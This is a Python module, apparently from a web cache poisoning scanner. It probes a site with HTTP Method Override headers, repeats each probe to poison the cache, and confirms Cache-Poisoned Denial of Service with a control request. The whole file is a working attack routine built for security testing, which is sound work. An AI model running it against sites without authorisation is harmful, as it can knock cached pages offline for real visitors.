#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

from modules.utils import requests, random, configure_logger, human_time

logger = configure_logger(__name__)

VULN_NAME = "HTTP Method Override"

CONTENT_DELTA_RANGE = 500
BIG_CONTENT_DELTA_RANGE = 5000

def HMO(url, s, initial_response, authent, human):
    """Function to test for HTTP Method Override vulnerabilities"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    methods = [
        "GET",
        "POST",
        "PATCH",
        "PUT",
        "DELETE",
        "HEAD",
        "TRACE",
        "HELP",
        "OPTIONS",
        "CONNECT",
        "PURGE",
        "RESUME",
        "SEARCH",
        "MERGE",
        "LOCK",
        "UNLOCK",
        "SYNC",
        "ARCHIVE",
        "CLONE",
        "ROLLBACK",
        "EXECUTE",
        "INTROSPECT",
        "NONSENSE",
    ]

    hmo_headers = [
        "HTTP-Method-Override",
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "Method-Override",
        "X-HTTP-Method",
        "HTTP-Method",
    ]

    main_status_code = initial_response.status_code
    main_len = len(initial_response.content)

    for header, method in (
        (header, method) for header in hmo_headers for method in methods
    ):
        uri = f"{url}{random.randrange(999)}"
        try:
            probe_headers = {header: method}
            print(f" \033[34m {VULN_NAME} : {probe_headers}\033[0m\r", end="")
            print("\033[K", end="")
            probe = s.get(
                uri,
                headers=probe_headers,
                verify=False,
                timeout=10,
                auth=authent,
                allow_redirects=False,
            )
            human_time(human)

            range_exlusion = range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE) if main_len < 10000 else range(main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE)
            #print(range_exlusion)

            if probe.status_code != main_status_code and probe.status_code not in [
                main_status_code,
                429, 403
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code}"
                )
                status = "\033[33m└── [INTERESTING BEHAVIOR]\033[0m"
            elif len(probe.content) != main_len and len(probe.content) not in range_exlusion:
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(probe.content)}b"
                )
                #print(probe.content)
                status = "\033[33m└── [INTERESTING BEHAVIOR]\033[0m"
            elif probe.status_code == main_status_code and len(probe.content) in range_exlusion:
                continue

            for _ in range(15):
                probe = s.get(
                    uri,
                    headers=probe_headers,
                    verify=False,
                    timeout=10,
                    auth=authent,
                    allow_redirects=False,
                )
                human_time(human)
            control = requests.get(uri, verify=False, headers={"User-agent": "xxxxx"}, timeout=10, auth=authent)
            #print(control)
            #print(probe)
            #print(len(control.content))
            #print(len(probe.content))
            if control.status_code == probe.status_code and control.status_code not in [
                main_status_code,
                429, 403
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {control.status_code}"
                )
                status = "\033[31m└── [VULNERABILITY CONFIRMED]\033[0m"

            if len(control.content) == len(probe.content) and len(probe.content) not in range_exlusion:
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(control.content)}b"
                )
                #print(control.content)
                status = "\033[31m└── [VULNERABILITY CONFIRMED]\033[0m"

            if reason:
                print(
                    f" {status} | HMO DOS | \033[34m{uri}\033[0m | {reason} | PAYLOAD: {probe_headers}"
                )

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
